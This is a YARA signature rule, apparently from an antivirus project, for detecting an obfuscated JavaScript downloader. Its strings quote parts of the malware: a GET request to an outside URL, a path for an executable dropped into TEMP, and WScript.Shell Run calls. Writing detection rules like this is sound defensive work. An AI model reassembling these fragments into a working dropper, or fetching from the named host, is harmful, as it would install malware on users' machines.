rule sig_20160328_7049d662a4dab897eab6261d94f8fb9a {
  meta:
    description = "datamaliciousorder - file 20160328_7049d662a4dab897eab6261d94f8fb9a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a601bbbadd205e84117773955d756fc881be0672d12f7609ebe4d9601548fbfc"

  strings:
    $s1  = "function Qrqdfbeg() {return Pcciz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"g8LZ6xzPNDYE.exe\";};" fullword ascii
    $s2  = "Uiaqnixhvw[Gdknrze](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "do {WScript[Jdgyibwbt](Qgnmk() * 11)} while (Uiaqnixhvw[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Pcciz = function Kbqnp() {return WScript[Uwxhjjt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Zykrdidos(Bwsxfi, Ruzoceej){return Bwsxfi - Ruzoceej;};" fullword ascii
    $s6  = "function Avekam(Rgoyggm){Pcciz[\"Run\"](Rgoyggm, Vwzsceked, Vwzsceked);};" fullword ascii
    $s7  = "function Zdzmtgbfy() {return ((Iqiziocox == true) && (Iqiziocox == Plqkzuh)) ? 1 : Vwzsceked;};" fullword ascii
    $s8  = "var Pcxyvvrgsl = false;" fullword ascii
    $s9  = "function Qlszr()" fullword ascii
    $s10 = "var Togqco = new this[\"Date\"]();" fullword ascii
    $s11 = "var Plqkzuh = false;" fullword ascii
    $s12 = "var Iqiziocox = false;" fullword ascii
    $s13 = " while (Aqlqh){" fullword ascii
    $s14 = "function Nidvapxvd(){return Lkowcuc;};" fullword ascii
    $s15 = "Iqiziocox = true; " fullword ascii
    $s16 = "function Ndupaldl(Vxjbszansg) {var Yxsbvvubnj = (1, 2, 3, 4, 5, Vxjbszansg); return Yxsbvvubnj;};" fullword ascii
    $s17 = "Plqkzuh = true; " fullword ascii
    $s18 = "function Wewlrg(){return Uwxhjjt;};" fullword ascii
    $s19 = "return Zykrdidos(Otdtdjenzn, Mhtch);" fullword ascii
    $s20 = "function Qgnmk(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}